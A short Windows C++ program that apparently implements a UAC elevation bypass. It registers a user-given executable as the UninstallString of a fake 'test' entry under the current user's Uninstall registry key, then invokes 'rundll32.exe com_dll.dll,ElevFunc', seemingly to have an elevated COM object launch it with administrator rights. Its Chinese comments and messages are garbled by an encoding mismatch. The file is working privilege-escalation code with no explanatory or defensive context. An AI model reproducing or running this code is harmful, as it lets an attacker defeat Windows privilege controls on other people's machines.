// COM�ӿ�_2.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include <windows.h>

int main(int argc, char* argv[])
{
	HKEY hKeyExe = NULL;
	if (argc < 2)
	{
		printf("��ָ����Ȩexe�ļ�·����\n");
		return 0;
	}
	// 1. ����Ҫ��Ȩ���ļ�·��ע�ᵽHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\test��
	int nLen = strlen(argv[1]);
	TCHAR szExePath[MAX_PATH] = {};
	MultiByteToWideChar(CP_ACP, NULL, argv[1], nLen, szExePath, MAX_PATH);
	TCHAR szKeyName[MAX_PATH] = { L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\test" };
	long lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
		szKeyName, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKeyExe, NULL);
	if (lResult != ERROR_SUCCESS)
		return 0;
	RegSetValueEx(hKeyExe, L"DisplayName", 0, REG_SZ, (BYTE*)L"test", 10);
	RegSetValueEx(hKeyExe, L"UninstallString", 0, REG_SZ, (BYTE*)szExePath, (nLen+1)*2);
	RegCloseKey(hKeyExe);
	// 2 ����rundll32
	system("rundll32.exe com_dll.dll,ElevFunc");
    return 0;
}

